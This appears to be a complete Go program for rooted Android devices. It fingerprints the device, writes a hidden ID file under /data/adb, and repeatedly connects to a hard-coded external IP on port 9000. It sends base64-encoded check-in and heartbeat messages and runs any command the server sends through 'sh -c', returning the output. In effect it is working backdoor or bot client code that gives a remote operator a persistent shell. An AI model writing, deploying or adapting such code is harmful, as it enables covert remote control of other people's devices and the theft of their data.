package main

import (
        "bufio"
        "crypto/md5"
        "encoding/base64"
        "encoding/hex"
        "encoding/json"
        "net"
        "os"
        "os/exec"
        "strings"
        "time"
)

type Message struct {
        Type     string `json:"type"`
        DeviceID string `json:"device_id,omitempty"`
        TaskID   string `json:"task_id,omitempty"`
        Command  string `json:"command,omitempty"`
        Output   string `json:"output,omitempty"`
        Error    string `json:"error,omitempty"`
}

func encode(v any) string {
        b, _ := json.Marshal(v)
        return base64.StdEncoding.EncodeToString(b)
}

func decode(s string, v any) error {
        b, err := base64.StdEncoding.DecodeString(strings.TrimSpace(s))
        if err != nil {
                return err
        }
        return json.Unmarshal(b, v)
}

func getDeviceID() string {
        const path = "/data/adb/.deviceid"

        if b, err := os.ReadFile(path); err == nil {
                id := strings.TrimSpace(string(b))
                if id != "" {
                        return id
                }
        }

        var parts []string

        if _, err := exec.LookPath("getprop"); err == nil {
                for _, k := range []string{
                        "ro.serialno",
                        "ro.product.model",
                        "ro.product.manufacturer",
                        "ro.product.brand",
                } {
                        if out, err := exec.Command("getprop", k).Output(); err == nil {
                                v := strings.TrimSpace(string(out))
                                if v != "" {
                                        parts = append(parts, v)
                                }
                        }
                }
        }

        if len(parts) == 0 {
                if b, err := os.ReadFile("/system/build.prop"); err == nil {
                        for _, k := range []string{
                                "ro.serialno",
                                "ro.product.model",
                                "ro.product.manufacturer",
                        } {
                                for _, line := range strings.Split(string(b), "\n") {
                                        if strings.HasPrefix(line, k+"=") {
                                                parts = append(parts, strings.TrimPrefix(line, k+"="))
                                                break
                                        }
                                }
                        }
                }
        }

        if len(parts) == 0 {
                return "unknown"
        }

        raw := strings.Join(parts, "_")
        sum := md5.Sum([]byte(raw))
        id := hex.EncodeToString(sum[:])

        _ = os.MkdirAll("/data/adb", 0700)
        _ = os.WriteFile(path, []byte(id), 0600)

        return id
}

func heartbeat(w *bufio.Writer) {
        for {
                time.Sleep(5 * time.Second)
                w.WriteString(encode(Message{Type: "ping"}) + "\n")
                w.Flush()
        }
}

func main() {
        deviceID := getDeviceID()

        for {
                conn, err := net.Dial("tcp", "178.239.122.13:9000")
                if err != nil {
                        time.Sleep(3 * time.Second)
                        continue
                }

                reader := bufio.NewReader(conn)
                writer := bufio.NewWriter(conn)

                // hello
                writer.WriteString(encode(Message{
                        Type:     "hello",
                        DeviceID: deviceID,
                }) + "\n")
                writer.Flush()

                go heartbeat(writer)

                for {
                        line, err := reader.ReadString('\n')
                        if err != nil {
                                conn.Close()
                                break
                        }

                        var msg Message
                        if decode(line, &msg) != nil {
                                continue
                        }

                        if msg.Type == "task" {
                                cmd := exec.Command("sh", "-c", msg.Command)
                                out, err := cmd.CombinedOutput()

                                res := Message{
                                        Type:   "result",
                                        TaskID: msg.TaskID,
                                        Output: string(out),
                                }
                                if err != nil {
                                        res.Error = err.Error()
                                }

                                writer.WriteString(encode(res) + "\n")
                                writer.Flush()
                        }
                }

                time.Sleep(2 * time.Second)
        }
}
